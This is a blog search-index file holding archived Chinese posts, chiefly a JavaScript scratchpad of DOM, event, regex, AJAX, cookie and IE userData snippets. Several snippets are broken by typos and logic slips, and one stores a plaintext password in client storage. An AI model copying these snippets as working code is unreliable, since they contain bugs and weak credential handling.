function()&#123; ....&#125;;Anim. method(&apos;start&apos;, function()&#123; .... &#125;). method(&apos;stop&apos;, function()&#123; .... &#125;);]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[平时积累的一点东西]]></title>
    <url>%2Fblog%2F2012%2F09%2F16%2F2012-09-16-%E5%B9%B3%E6%97%B6%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E7%82%B9%E4%B8%9C%E8%A5%BF%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本文从ITeye导入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646** ☆★☆★☆★☆★☆★☆JavaScript草稿集☆★☆★☆★☆★☆★☆** By Barret Lee★JQuery★&lt;!--&lt;script type=&quot;text/javascript&quot; src=&quot;http:code.jquery.com/jquery-latest.js&quot;&gt;&lt;/script&gt;--&gt;★★★★★★★★公共部分★★★★★★★★ function printf(obj) &#123; document.write(obj + &quot;&lt;br&gt;&quot;); &#125; function $(obj) &#123; return document.getElementById(obj); &#125; function forEach(obj) &#123; for (m in obj) &#123; printf(m + &apos;:&apos; + obj[m]); &#125; &#125;★★★★★★★★注释方式★★★★★★★★★ * * &lt;!--[CDATA[ * * ]]--&gt;★★★★★★★★alertBox★★★★★★★★ function alertBox() &#123; &quot;use strict&quot;; var coverLayer = document.createElement(&quot;div&quot;); var contentLayer = document.createElement(&quot;div&quot;); coverLayer.setAttribute(&quot;id&quot;, &quot;coverLayer&quot;); contentLayer.setAttribute(&quot;id&quot;, &quot;contentLayer&quot;); contentLayer.innerHTML = &quot;&lt;p&gt;Huazhong University Of Science And Technology&lt;/p&gt;&quot;; document.body.appendChild(coverLayer); document.body.appendChild(contentLayer); &#125; window.onload = alertBox;★★★★★★★★基本数据类型★★★★★★★★ var x = parseFloat(&quot;20.33&quot;); var y = parseInt(&quot;11&quot;, 8); var z = Math.sin(Math.PI / 2); var s = &quot;this is a string.&quot;; var a = [1, 2, 4, 3]; var o = &#123;first: 1, second: 2, third: 3&#125;; var result = o.valueOf(); printf(result + &quot;&lt;br&gt;&quot;); printf(1 + &quot;2&quot; + &quot;&lt;br&gt;&quot;); 12 printf((a instanceof Array) + &quot;&lt;br&gt;&quot;); printf((a.constructor) + &quot;&lt;br&gt;&quot;); printf(o.hasOwnProperty(&quot;first&quot;) + &quot;&lt;br&gt;&quot;);★★★★★★★★arguments数组★★★★★★★★ function plus(x, y, z) &#123; &quot;use strict&quot;; if (arguments.length !== 3) &#123; throw new Error(arguments.callee); &#125; return x + y + z; &#125; plus(2, 3); printf(plus(2, 3, 4)); var cal = &#123; x: 1, y: 2, f: function () &#123; &quot;use strict&quot;; return this.x + this.y; &#125; &#125;; printf(cal.f() + &quot;&lt;br&gt;&quot;);★★★★★★★★函数call和apply★★★★★★★★ function fCall(x, y) &#123; return x + y; &#125; var res = fCall.call(cal, 1, 2); var res1 = fCall.apply(cal,[6, 9]); printf(res + &quot;&lt;br&gt;&quot;); printf(res1 + &quot;&lt;br&gt;&quot;);★★★★★★★★类和继承★★★★★★★★ function people(name, age, sex) &#123; this.name = name; this.age = age; this.sex = sex; &#125; people.prototype.info = function () &#123; printf(&quot;My name is &quot; + this.name + &quot;, I&apos;m &quot; + this.age + &quot; years old.&quot; + &quot;&lt;br&gt;&quot;); &#125; var humen = new people(&quot;Lijing&quot;, 19, &quot;man&quot;); humen.info();★★★★★★★★IE4 &amp;&amp; IE5 没有apply函数，利用prototype来构造这样的原型函数★★★★★★★★ if (!Function.prototype.apply) &#123; Function.prototype.apply = function (object, parameters) &#123; var f = this; var o = object || window; var args = patameters || []; o._$_apply_$_ = f; var stringArgs = []; for (var i = 0; i &lt; args.length; i++) &#123; stringArgs[i] = &quot;args[&quot; + i + &quot;]&quot;; &#125; var arglist = stringArgs.join(&quot;,&quot;); var methodcall = &quot;o._$_apply_$_(&quot; + arglist + &quot;);&quot;; var result = eval(methodcall); delete o._$_apply_$_; return result; &#125;; &#125; ★★★★★★★★类属性,类方法,类私有成员,子类与超类★★★★★★★★ function Rectangle(width, height) &#123; this.width = width; this.height = height; &#125; Rectangle.prototype.area = function () &#123; return this.width * this.height; &#125; function PositionRectangle(x, y, w, h) &#123; Rectangle.call(this, w, h); this.x = x; this.y = y; &#125; PositionRectangle.prototype = new Rectangle(); delete PositionRectangle.prototype.width; delete PositionRectangle.prototype.height; PositionRectangle.prototype.constructor = PositionRectangle; var r = new PositionRectangle(2, 2, 2, 2); printf(r.area()); printf(r instanceof PositionRectangle &amp;&amp; r instanceof Rectangle &amp;&amp; r instanceof Object); 注：可以使用call和apply来调用被覆盖的函数 such as: Circle.prototype.toString.apply(this);★★★★★★★★非继承的扩展★★★★★★★★ function borrowMethods(borrowFrom, addTo) &#123; var from = borrowFrom.prototype; var to = addTo.prototype; for (m in from) &#123; if (from[m] != &quot;function&quot;) continue; to[m] = from[m]; &#125; &#125;★★★★★★★★确定对象类型★★★★★★★★ △ typeof null → &quot;object&quot;; typeof undefined → &quot;undefined&quot;; typeof 数组 → &quot;object&quot;; typeof 函数 → &quot;function&quot; △ instanceof 和构造函数 constructor 【特点：他们只能允许根据已经知道的类来进行测试对象，无法用于检查未知的对象】 △ 用Object.toString()测试对象的类型 △ 鸭子类型识别（Duck Typing）★★★★★★★★渐变效果★★★★★★★★ function setOpacity(obj, val) &#123; if (document.documentElement.filters)&#123; obj.style.filter = &quot;alpha(opacity=&quot; + val + &quot;)&quot;; &#125;else &#123; obj.style.opacity = val / 100; &#125; &#125; function fadeIn(obj) &#123; var val = 10; var t = setInterval(function()&#123; if (val &gt;= 100) &#123; clearInterval(t); &#125; setOpacity(obj, val); val += 10; &#125;, 250); &#125; ★★ fadeIn($(&quot;changeBox&quot;)); function setWidth(obj, val) &#123; obj.style.width = parseInt(val) + &quot;px&quot;; &#125; function setHeight(obj, val) &#123; obj.style.height = parseInt(val) + &quot;px&quot;; &#125; function slide(obj) &#123; var val = 0; var t = setInterval(function()&#123; if (val &gt;= 300) &#123; clearInterval(t); &#125; setWidth(obj, val); setHeight(obj, val); val += 10; &#125;, 80); &#125; ★★ slide($(&quot;changeBox&quot;)); function setTop(obj, val) &#123; obj.style.top = parseInt(val) + &quot;px&quot;; &#125; function setLeft(obj, val) &#123; obj.style.left = parseInt(val) + &quot;px&quot;; &#125; function move(obj) &#123; var val = 0; var t = setInterval(function()&#123; if (val &gt;= 300) &#123; clearInterval(t); &#125; setTop(obj, val); setLeft(obj, val); val += 10; &#125;, 80); &#125; ★★ move($(&quot;changeBox&quot;));★★★★★★★★正则表达式★★★★★★★★ 正则表达式中的特殊符号有 ^ $ . * + ? = ! | \ / () [] &#123;&#125; *|------------------------------------------------------------ * | [...] 括号内任意字符 * | [^...] 非上 * | . 除换行符和其他Unicode行终止符之外的任意字符 * | \w 任何ASCII单字字符 * | \W 非上 * | \s 任何Unicode空白 * | \S 非上 * | \d 任何ASCII数字，等价于[0-9] * | \D 非上 * | \b 匹配一个词语的边界 * | \B 非上 * | &#123;n, m&#125; 匹配至少 n 至多 m 次 * | &#123;n,&#125; 匹配至少 n 次 * | &#123;n&#125; 匹配恰好 n 次 * | ? 匹配前一项0或1次 * | + 匹配前一项1次或多次 * | * 匹配前一项0次或多次 * | ^ 匹配字符串开头 * | $ 匹配字符串结尾 * | i 忽略大小写 * | g 全局匹配 * | m 多行匹配 * |------------------------------------------------------------- var text = &quot;JavaScript is not Java, thanks god, that is true! Java is not Javascript!!&quot;; var url = &quot;http:www.baidu.com/pic.html&quot; var Reg = /java/gi; var RegUrl = /(\w+):\/\/([\w.]+)\/(\S*)/; var res = url.match(RegUrl); var res = text.replace(/Java/gi, &quot;JAVA&quot;); var res = Reg.exec(text); var res = Reg.test(text); printf(text); printf(res);★★★★★★★★drag拖动★★★★★★★★ var box = document.getElementById(&quot;box&quot;); var drag = &#123; start: function(evt) &#123; var e = window.event || evt; box.startX = e.clientX - box.offsetLeft; box.startY = e.clientY - box.offsetTop; document.onmousemove = drag.ondrag; document.addEventListener ? document.addEventListener(&quot;mouseup&quot;,drag.stop,false) : document.attachEvent(&quot;onmouseup&quot;,drag.stop); &#125;, ondrag: function(evt) &#123; var e = window.event || evt; with(box.style) &#123; position = &quot;absolute&quot;; left = e.clientX - box.startX + &quot;px&quot;; top = e.clientY - box.startY + &quot;px&quot;; &#125;; &#125;, stop: function() &#123; document.onmousemove = &quot;&quot;; document.detachEvent ? document.detachEvent(&quot;onmouseup&quot;,drag.start) : document.removeEventListener(&quot;mouseup&quot;,drag.start,false); &#125;, init: function() &#123; box.addEventListener ? box.addEventListener(&quot;mousedown&quot;,drag.start,false) : box.attachEvent(&quot;onmousedown&quot;,drag.start); &#125; &#125; drag.init();★★★★★★★★浏览器Location和History★★★★★★★★Location: protocol + host + pathname + searchprintf(document.location == document.URL); true在大多数情况下，document.location和location.href是相同的，但是，当存在服务器重定向时，document.location包含的是装载的URL，而location.href包含的则是原始请求的文档的URL |-------self, window | |-------navigator | |-------frames[] |------forms[]--------elments[]------options[] | | |-------location |------anchors[] | | |-------document--------|------links[] | | |-------history |------images[] | | |-------screen |------applets[]for(m in navigator)&#123;printf(m + &quot;:&quot; + screen[m]);&#125; printf(window.screenX); printf(window.screenY); printf(window.outerWidth); printf(window.outerHeight); printf(window.innerWidth); printf(window.innerHeight); 以上属性IE7下没有 printf(&quot;&quot;); printf(screen.width); printf(screen.height); printf(screen.availWidth); printf(screen.availHeight); 子窗口和父窗口的相互控制 function openWin() &#123; childWin = window.open(&quot;javascript:&apos;&lt;h1&gt;hello&lt;/h1&gt;&apos;&quot;, &quot;newWin&quot;, &quot;height=0,width=0&quot;); var val = 0; var t = setInterval(function()&#123; if (val &gt; 400)&#123; clearInterval(t); &#125; childWin.resizeTo(val,val); childWin.moveTo(val,val); val += 10; &#125;,100); childWin.opener.focus(); childWin.opener.close(); &#125; function closeWin() &#123; childWin.close(); &#125; document.onclick = openWin; document.onkeydown = closeWin;★★★★★★★★ERROR提示★★★★★★★★ window.onerror = function (msg, url, line) &#123; alert(&quot;Wow..my gosh!!! You got an error.\n\n&quot; + &quot;【Error】: &quot; + msg + &quot;\n【url】: &quot; + url + &quot;\n【line】: &quot; + line); &#125;★★★★★★★★document★★★★★★★★ 帧结构演示 &lt;html&gt; &lt;frameset cols=&quot;200,*&quot;&gt; &lt;frame src=&quot;./gustbook.html&quot;&gt; &lt;frame src=&quot;/gustbook.html&quot; name=&quot;view_frame&quot;&gt; &lt;/frameset&gt; &lt;/html&gt; function w() &#123; printf(&quot;something&quot;); &#125; setTimeout(w,1000); 覆盖原来的文本 注：一个文档绝不应该从时间句柄中调用他自己的write()方法 ★document.open 功能：打开一个新文档，并擦除当前文档的内容。 语法：document.open(mimetype,replace) 参数： mimetype：可选。规定正在写的文档的类型。默认值是&quot;text/html&quot;。 replace：可选。当此参数设置后，可引起新文档从父文档继承历史条目。 注1：open()方法将擦除当前HTML文档的内容，开始一个新的文档，新文档用write()方法或writeln()方法编写。 注2：调用open()方法打开一个新文档并且用write()方法设置文档内容后，必须记住用close()方法关闭文档，并迫使其内容显示出来。 注3：属于被覆盖的文档的一部分的脚本或事件句柄不能调用该方法，因为脚本或事件句柄自身也会被覆盖。 ★document.close 功能：close()方法可关闭一个由open()方法打开的输出流，并显示选定的数据。 语法：document.close() 参数：无。 注：该方法将关闭open()方法打开的文档流，并强制地显示出所有缓存的输出内容。如果您使用write()方法动态地输出一个文档，必须记住当你这么做的时候要调用close()方法，以确保所有文档内容都能显示。 ★一旦调用了close()，就不应该再次调用write()，因为这会隐式地调用open()来擦除当前文档并开始一个新的文档。★★★★★★★★节点类型★★★★★★★★ |--------------------------------| | 接口 nodeType值 | |--------------------------------| | Element 1 | | Text 3 | | Document 9 | | Comment 8 | | DocumentFragment 11 | | Attr 2 | |--------------------------------|★★★★★★★★document.documentElement★★★★★★★★ 引用的是 htmlappendChild(), insetBefore(), replaceChild()可以用document.createDocumentFragment()来创建一个DocumentFragment function reverse(n) &#123; var f = document.createDocumentFragment(); while (n.lastChild) f.appendChild(n.lastChild); n.appendChild(f); &#125;★★★★★★★★查询选定的文本★★★★★★★★ function getSelectedText() &#123; if (window.getSelection) &#123; return window.getSelection().toString(); &#125;else if (document.getSelection) &#123; return document.getSelection(); &#125;else &#123; return document.selection.createRange().text; &#125; &#125; function start() &#123; var text = getSelectedText(); if (text) &#123; $(&quot;changeBox&quot;).innerHTML = text; window.open(&quot;http:www.baidu.com/s?wd=&quot; + encodeURIComponent(text)); &#125; &#125; if (!document.all) &#123; window.onmouseup = start; &#125;else &#123; document.attachEvent(&quot;onmouseup&quot;, start); &#125; var o = $(&quot;changeBox&quot;); printf(o.offsetTop); printf(o.offsetLeft); printf(o.clientWidth); printf(o.clientHeight); printf(o.scrollTop); printf(o.scrollLeft); printf(o.offsetWidth); printf(o.offsetHeight);★★★★★★★★Key Event and Mouse Event★★★★★★★★ 屏蔽右键菜单,可以应用到任何一个区域 oncontextmenu=&quot;window.event.returnValue=false&quot; document.onmousedown = function (e) &#123; var e = window.event || e; if (e.button == 0) &#123; document.body.style.background = &quot;red&quot;; &#125;else if (e.button == 1) &#123; document.body.style.background = &quot;blue&quot;; &#125;else &#123; document.body.style.background = &quot;yellow&quot;; &#125; &#125; document.onkeydown = function (e) &#123; var e = window.event || e; if (e.shiftKey) &#123; alert(&quot;shift&quot;); &#125;if (e.ctrlKey) &#123; alert(&quot;ctrl&quot;); &#125;else if (e.altKey) &#123; alert(&quot;alt&quot;); &#125;else &#123; alert(&quot;others&quot;); &#125; &#125;★★★★★★★★合成事件★★★★★★★★ Document.createEvent()创建, Event.initEvent(), UIEvent.initEvent(), MouseEvent.initEvent.initMouseEvent()初始化 dipatchEvent方法来分派事件 IE中，使用Document.createEventObjec来创建一个新的事件对象。然后使用目标元素的fireEvent()方法来分派他 var DataEvent = &#123;&#125;; DataEvent.send = function (target, datatype, data) &#123; if (typeof target == &quot;string&quot;) target = $(target); if (document.createEvent) &#123; var e = createEvent(&quot;Events&quot;); e.initEvent(&quot;dataavailable&quot;, true, false); &#125;else if (document.createEventObject) &#123; var e = document.createEventObject(); &#125;else return; e.datatype = datatype; e.data = data; if (target.dispatchEvent) target.dispatchEvent(e); else if (target.fireEvent) target.fireEvent(&quot;ondataavailable&quot;, e); &#125;; DataEvent.receive = function (target, handler) &#123; if (typeof target == &quot;string&quot;) target = $(target); if (target.addEventListener) target.addEventListener(&quot;dataavailable&quot;, handler, false); else if (target.attachEvent) target.attachEvent(&quot;ondataavaliable&quot;, handler); &#125;★★★★★★★★IE支持客户端永久性★★★★★★★★ var username = &quot;hustskyking&quot;; var password = &quot;psw&quot;; var memory = $(&quot;changeBox&quot;); memory.style.behavior = &quot;url(&apos;#default#userData&apos;)&quot;; memory.setAttribute(&quot;username&quot;, username); memory.setAttribute(&quot;password&quot;, password); memory.save(&apos;myPersistentData&apos;); var now = (new Date()).getTime(); var expires = now + 10*24*60*60*1000; memory.expires = (new Date(expires)).toUTCString(); var memory = $(&quot;changeBox&quot;); memory.load(&quot;myPersistentData&quot;); alert(memory.getAttribute(&quot;username&quot;));★★★★★★★★AJAX★★★★★★★★ function loadXMLDoc() &#123; var xmlhttp = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); xmlhttp. xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200) &#123; $(&quot;changeBox&quot;).innerHTML = xmlhttp.responseText; &#125; &#125; xmlhttp.open(&quot;GET&quot;, &quot;response.php?func=&quot; + printf(&quot;Instead of origin HTML&quot;), true); xmlhttp.send(); &#125; window.onclick = loadXMLDoc; function createXHR() &#123; var aVersions = [&quot;MSXML2.XMLHttp.6.0&quot;, &quot;MSXML2.XMLHttp.3.0&quot;]; for (var i = 0; i &lt; aVersions; i++) &#123; try &#123; var oXHR = new ActiveXObject(aVersions[i]); return oXHR; &#125;catch(oError)&#123; 不执行任何操作 &#125; &#125; throw new Error(&quot;MSXML is not installed.&quot;); &#125;在给src特性复制的同时会下载一个图像，这意味着甚至无需将该图像添加到页面中基于图像实现跨域通信** 启动并连续向服务器发送骑牛的最佳方式是什么？在有些情况下，最好是从服务器与载入一些信息，* 以便能够快读相应用户的操；而在另外一些情况下，你可能想在不同的时间间隔内，向服务器发送* 数据或者从服务器接收数据。 var oImg = document.createElement(&quot;img&quot;); oImg.onload = function() &#123; alert(&quot;Image is ready&quot;); &#125; oImg.src = &quot;./images/001.gif&quot;; document.body.appendChild(oImg); function createIFrame()&#123; var oframe = document.createElement(&quot;iframe&quot;); oframe.name = &quot;myIFrame&quot;; oframe.id = &quot;myIFrame&quot;; oframe.style.cssText = &quot;height:500px; width:400px; border:none&quot;; oframe.src = &quot;http:jqueryui.com/demos/droppable/accepted-elements.html&quot;; document.body.appendChild(oframe); &#125; createIFrame();面向对象的Javascript1.公共成员function Customer() &#123; this.firstName = &quot;John&quot;; this.lastName = &quot;Smith&quot;; this.getFullName = function () &#123; return this.firstName + &quot; &quot; + this.lastName; &#125;&#125;var john = new Customer();2.私有变量function Customer(firstName, lastName) &#123; var _firstName = firstName; var _lastName = lastName; this.getFullName = function () &#123;闭包 return _firstName + &quot; &quot; + _lastName; &#125;&#125;prototype属性扩展类的定义如果在prototype属性所引用的对象里没有找到，它会到这个引用对象的prototype属性里查找，如此递归查询。Customer.prototype.getFullName = function () &#123; return this.firstName + &quot; &quot; + this.lastName;&#125;面向对象编程和继承function Partner() &#123; this.partnerId = &quot;&quot;;&#125;Partner.prototype = new Customer();与上等价Partner.prototype = &#123; firstName: &quot;&quot;, lastName: &quot;&quot;&#125;★★★★★★★★Cookie★★★★★★★★function setCookie(name,value,days) &#123; if (days) &#123; var date = new Date(); date.setTime(date.getTime()+(days*24*60*60*1000)); var expires = &quot;; expires=&quot;+date.toGMTString(); &#125; else var expires = &quot;&quot;; document.cookie = name+&quot;=&quot;+value+expires+&quot;; path=/&quot;;&#125;function getCookie(name) &#123; var nameEQ = name + &quot;=&quot;; var ca = document.cookie.split(&apos;;&apos;); for(var i=0;i &lt; ca.length;i++) &#123; var c = ca[i]; while (c.charAt(0)==&apos; &apos;) c = c.substring(1,c.length); if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length); &#125; return null;&#125;function deleteCookie(name) &#123; setCookie(name,&quot;&quot;,-1);&#125;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax请求管理]]></title>
    <url>%2Fblog%2F2012%2F09%2F16%2F2012-09-16-ajax%E8%AF%B7%E6%B1%82%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本文从ITeye导入 ajax请求管理&mdash;&mdash;问题提出 &nbsp;&nbsp;&nbsp; Ajax应用程序虽然很强大且对用户很友好，但是也存在一些问题。 &nbsp;&nbsp;&nbsp; 如果客户端向服务器发送请求过于频繁，服务器将会陷入对来自多个用户的大量请求的处理中。进而，客户端在等待服务器返回大量的响应时就会变得十分迟钝。 &nbsp;&nbsp;&nbsp; HTTP1.1规范中规定一个客户端在同一时刻与同一个域名不能有两个以上的链接。虽然有一些方法能够突破这个限制（诸如使用子域名来处理某些请求），但绝大多数浏览器在同一时刻能够发起的链接也是有限的。 &nbsp;&nbsp;&nbsp; 当使用XHR时，这个限制将在后台进行处理：你只是根据自己的需求来启动请求，而浏览器在打开连接时将把他们放到队列中逐步发送。当请求比较少或者间隔比较长时，这种工作机制是能够满足需求的；但当在不同时刻，应用程序的各个部分都将发送请求时，这种内建的队列机制就无法提供足够的控制，无法确定请求将在何时发送，哪个请求先发送等。 &nbsp;&nbsp;&nbsp; 幸好，实现一个能够处理更复杂通信模式的自定义请求管理器并不难~ &nbsp;&nbsp;&nbsp; 待续……]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大学的第一天]]></title>
    <url>%2Fblog%2F2008%2F08%2F20%2F2008-08-20-%E5%A4%A7%E5%AD%A6%E7%9A%84%E7%AC%AC%E4%B8%80%E5%A4%A9%2F</url>
    <content type="text"><![CDATA[大学的第一天]]></content>
  </entry>
</search>
